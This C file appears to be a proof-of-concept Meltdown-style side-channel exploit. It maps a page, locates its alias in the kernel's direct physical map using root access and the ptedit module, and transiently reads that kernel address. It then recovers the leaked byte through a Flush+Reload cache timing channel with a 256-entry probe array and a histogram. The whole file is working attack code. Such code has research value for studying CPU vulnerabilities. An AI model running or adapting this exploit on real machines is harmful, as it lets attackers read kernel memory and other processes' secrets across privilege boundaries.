#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>

#include "../../cacheutils.h"
// #include "../../ptedit_header.h"

#include "share.h"

#define SECRET 'T'

// __attribute__((aligned(4096))) uint8_t oracles[4096*256];
extern uint8_t* probe_array;
extern uint8_t* unwritable_data;
extern void gadget(uint8_t *ptr);


__attribute__((aligned(4096))) uint8_t victim_page[4096];

int main(){

    uint8_t *oracles = (uint8_t*)&probe_array;

    //access oracles to avoid page fault
    for(int i = 0; i < 256; ++i){
        oracles[i<<12] = 1; 
    }

    // if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
    
    printf("cache threshold %ld\n", CACHE_MISS);

    if(ptedit_init()) {
        printf("Could not initialize ptedit (did you load the kernel module?)\n");
        return 1;
    }

    signal(SIGSEGV, trycatch_segfault_handler);
    signal(SIGBUS, trycatch_segfault_handler);
    signal(SIGILL, trycatch_segfault_handler);
    

    char *mapping = (char *)mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    memset(mapping, 1, 4096);
    size_t paddr = get_physical_address((size_t)mapping);

    if(!paddr){
        printf("[!]Could not get physical address! Did you start as root?\n");
        exit(1);
    }

    char *target = (char *)(get_direct_physical_map() + paddr);
    printf("Kernel address: %p\n", target);


    int cnt = 1000;
    int hist[1000] = {0};
    while(cnt -- ){
        flush(mapping);
        //flush probe array
        for(int i = 0; i < 256; ++i){
            flush((void *)&oracles[i<<12]);
        }
        mfence();
        if(!setjmp(trycatch_buf))
        {
            maccess(0);
            maccess(oracles + 4096 * target[0]);
        }

        //Recover data from cache covert channel
        for(int i = 0; i < 256; i++) {
        int mix_i = ((i * 167) + 13) % 256;
        // int mix_i = i;
        uint64_t t1 = reload_t(oracles + mix_i * 4096);
        if(t1 < CACHE_MISS && mix_i != 0){
            // printf("%c ", mix_i);
            hist[mix_i] ++;
        }
        }
            
    }

    //find max
    int max = 0;
    int max_score = -1;

    for(int i = 0;i < 1000; ++i){
        // printf("%d ", hist[i]);
        if(max_score < hist[i]){
            max_score = hist[i];
            max = i;
        }
    }

    printf("%c %d\n", max, hist[max]);

    ptedit_cleanup();
    return 0;
}